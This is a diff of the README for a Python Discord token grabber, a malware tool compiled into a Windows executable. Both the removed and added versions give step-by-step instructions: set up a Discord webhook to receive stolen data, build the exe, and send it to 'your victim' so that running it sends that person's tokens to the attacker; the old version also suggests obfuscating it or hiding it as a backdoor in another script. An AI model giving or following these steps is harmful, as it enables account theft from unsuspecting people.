@@ -1,5 +1,5 @@
 <h1>Token Grabber</h1>
-<p>A Discord token grabber written in Python compiled into EXE.</p>
+<p>A Discord token grabber written in Python compiled into exe.</p>
 
 Operating System: **Windows**
 
@@ -9,8 +9,11 @@ Operating System: **Windows**
 
 <br>
 
-# How to use
- 1. Create a webhook on your Discord server. I recommend creating a new server.
- 2. Change the 'WEBHOOK_URL' variable value to your Discord webhook URL in [token-grabber.py](token-grabber.py)
- 3. *(obfuscate the code or install it as a backdoor in an other script.)*
- 4. Send the script to your victim and make them run it.
+# Steps
+ 1. Create a webhook
+ 2. Change the two valuables in grabber.py
+ 3. Open installer.bat (wait for it to install, will auto-close)
+ 4. Open compiler.bat (wait for it to compile into exe)
+ 5. Go to the generated folder/directory called "dist"
+ 6. Copy and share the exe file with your victim
+ 7. You are done, once someone runs the exe file it'll send you the tokens that were found on the computer it was executed in
